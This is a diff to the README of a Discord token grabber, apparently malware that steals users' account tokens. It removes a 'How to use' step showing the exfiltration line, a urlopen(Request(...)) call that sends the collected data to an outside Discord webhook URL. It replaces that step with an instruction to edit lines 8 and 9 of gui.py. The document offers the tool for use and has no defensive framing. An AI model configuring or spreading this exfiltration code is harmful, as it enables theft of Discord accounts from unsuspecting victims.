@@ -7,17 +7,7 @@ Simple token grabber for discord (the token grabber code is not mine but I made 
 
 ## How to use
 
-To use the token grabber modify line 181
-
-from:
-```bash
-  urlopen(Request("Webhook", data=dumps(webhook).encode(), headers=getheaders()))
-```
-to:
-```bash
-  urlopen(Request("https://discord.com/api/webhooks/...", data=dumps(webhook).encode(), headers=getheaders()))
-```
-
+To use the token grabber modify line 8 and 9 (gui.py)
 
 
 
